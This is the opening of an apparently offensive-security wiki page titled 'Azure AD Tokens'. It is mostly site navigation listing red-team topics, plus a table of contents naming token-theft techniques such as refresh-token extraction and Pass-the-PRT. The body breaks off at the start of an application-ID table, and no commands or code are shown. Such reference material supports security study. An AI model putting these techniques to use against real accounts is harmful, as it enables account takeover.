  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bind Shell
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse Shell Cheat Sheet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../cheatsheets/source-code-management-ci/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Source Code Management & CI/CD Compromise
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cloud
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Cloud
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" >
        
          
          <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Aws
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4_1">
            <span class="md-nav__icon md-icon"></span>
            Aws
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/AWS%20Pentest/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cloud - AWS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-access-token/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Access Token & Secrets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-cognito/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Cognito
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-dynamodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - DynamoDB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-ec2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - EC2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-iam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Identity & Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-ioc-detection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - IOC & Detections
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-lambda/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - Lambda
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-metadata/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Metadata SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-s3-bucket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - S3 Buckets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-ssm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Service - SSM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../aws/aws-training/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AWS - Training
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
        
          
          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Azure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4_2">
            <span class="md-nav__icon md-icon"></span>
            Azure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Azure AD Tokens
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Azure AD Tokens
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#connection" class="md-nav__link">
    <span class="md-ellipsis">
      Connection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Connection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#az-cli" class="md-nav__link">
    <span class="md-ellipsis">
      az cli
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#azure-ad-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Azure AD Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#az-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Az Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#microsoft-graph-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Microsoft Graph Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-http-api" class="md-nav__link">
    <span class="md-ellipsis">
      External HTTP API
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#internal-http-api" class="md-nav__link">
    <span class="md-ellipsis">
      Internal HTTP API
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-token" class="md-nav__link">
    <span class="md-ellipsis">
      Access Token
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Access Token">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#access-token-locations" class="md-nav__link">
    <span class="md-ellipsis">
      Access Token Locations
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      Refresh Token
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Refresh Token">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-a-refresh-token-from-estsauth-cookie" class="md-nav__link">
    <span class="md-ellipsis">
      Get a Refresh Token from ESTSAuth Cookie
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-a-refresh-token-from-office-process" class="md-nav__link">
    <span class="md-ellipsis">
      Get a Refresh Token from Office process
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foci-refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      FOCI Refresh Token
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#primary-refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      Primary Refresh Token
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Primary Refresh Token">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#extract-prt-v1-pass-the-prt" class="md-nav__link">
    <span class="md-ellipsis">
      Extract PRT v1 - Pass-the-PRT
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-prt-on-device-with-tpm" class="md-nav__link">
    <span class="md-ellipsis">
      Extract PRT on Device with TPM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#request-a-prt-using-the-refresh-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Request a PRT using the Refresh Flow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#request-a-prt-with-hybrid-device" class="md-nav__link">
    <span class="md-ellipsis">
      Request a PRT with Hybrid Device
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upgrade-refresh-token-to-prt" class="md-nav__link">
    <span class="md-ellipsis">
      Upgrade Refresh Token to PRT
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enriching-a-prt-with-mfa-claim" class="md-nav__link">
    <span class="md-ellipsis">
      Enriching a PRT with MFA claim
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-ad-connect/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Connect
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-devices-users-sp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD IAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Enumerate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-phishing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure AD Phishing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-requirements/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Requirements
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-application-endpoint/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Endpoint
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-application-proxy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Application Proxy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-container-registry/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Container Registry
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-deployment-template/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Deployment Template
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-devops/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Azure DevOps
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-keyvault/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - KeyVault
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-microsoft-intune/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Microsoft Intune
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-office-365/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Office 365
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-runbook/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Runbook and Automation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-storage-blob/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Storage Blob
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-virtual-machine/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Virtual Machine
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../azure-services-web-apps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Services - Web Apps
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Command control
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Command control
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../command-control/cobalt-strike/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cobalt Strike
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../command-control/metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Containers
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Containers
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../containers/docker/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../containers/kubernetes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kubernetes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Methodology
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Methodology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bug Hunting Methodology
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability Reports
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Redteam
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_1" >
        
          
          <label class="md-nav__link" for="__nav_8_1" id="__nav_8_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Access
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_1">
            <span class="md-nav__icon md-icon"></span>
            Access
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/attack-surface-enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomains Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/html-smuggling/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTML Smuggling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/initial-access/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Initial Access
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/office-attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Office - Attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/windows-download-execute/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Download and execute methods
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/access/windows-using-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Using credentials
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_2" >
        
          
          <label class="md-nav__link" for="__nav_8_2" id="__nav_8_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Escalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_2">
            <span class="md-nav__icon md-icon"></span>
            Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_3" >
        
          
          <label class="md-nav__link" for="__nav_8_3" id="__nav_8_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_3">
            <span class="md-nav__icon md-icon"></span>
            Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/linux-evasion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Evasion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - AMSI Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/windows-defenses/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Defenses
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/evasion/windows-dpapi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - DPAPI
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_4" >
        
          
          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Persistence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_4">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/persistence/linux-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux - Persistence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/persistence/windows-persistence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows - Persistence
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8_5" >
        
          
          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../redteam/pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Network Pivoting Techniques
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#connection" class="md-nav__link">
    <span class="md-ellipsis">
      Connection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Connection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#az-cli" class="md-nav__link">
    <span class="md-ellipsis">
      az cli
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#azure-ad-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Azure AD Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#az-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Az Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#microsoft-graph-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Microsoft Graph Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#external-http-api" class="md-nav__link">
    <span class="md-ellipsis">
      External HTTP API
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#internal-http-api" class="md-nav__link">
    <span class="md-ellipsis">
      Internal HTTP API
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-token" class="md-nav__link">
    <span class="md-ellipsis">
      Access Token
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Access Token">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#access-token-locations" class="md-nav__link">
    <span class="md-ellipsis">
      Access Token Locations
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      Refresh Token
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Refresh Token">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#get-a-refresh-token-from-estsauth-cookie" class="md-nav__link">
    <span class="md-ellipsis">
      Get a Refresh Token from ESTSAuth Cookie
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-a-refresh-token-from-office-process" class="md-nav__link">
    <span class="md-ellipsis">
      Get a Refresh Token from Office process
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foci-refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      FOCI Refresh Token
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#primary-refresh-token" class="md-nav__link">
    <span class="md-ellipsis">
      Primary Refresh Token
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Primary Refresh Token">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#extract-prt-v1-pass-the-prt" class="md-nav__link">
    <span class="md-ellipsis">
      Extract PRT v1 - Pass-the-PRT
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-prt-on-device-with-tpm" class="md-nav__link">
    <span class="md-ellipsis">
      Extract PRT on Device with TPM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#request-a-prt-using-the-refresh-flow" class="md-nav__link">
    <span class="md-ellipsis">
      Request a PRT using the Refresh Flow
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#request-a-prt-with-hybrid-device" class="md-nav__link">
    <span class="md-ellipsis">
      Request a PRT with Hybrid Device
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#upgrade-refresh-token-to-prt" class="md-nav__link">
    <span class="md-ellipsis">
      Upgrade Refresh Token to PRT
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enriching-a-prt-with-mfa-claim" class="md-nav__link">
    <span class="md-ellipsis">
      Enriching a PRT with MFA claim
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="azure-ad-tokens">Azure AD Tokens</h1>
<h2 id="connection">Connection</h2>
<p>When you authenticate to the Microsoft Graph API in PowerShell/CLI, you will be using an application from a Microsoft's tenant.</p>
<ul>
<li><a href="https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in">Microsoft Applications ID</a></li>
</ul>
<table>
<thead>
<tr>
<th>Name</th>
<th>Application ID</th>
</tr>
</thead>
<tbody>
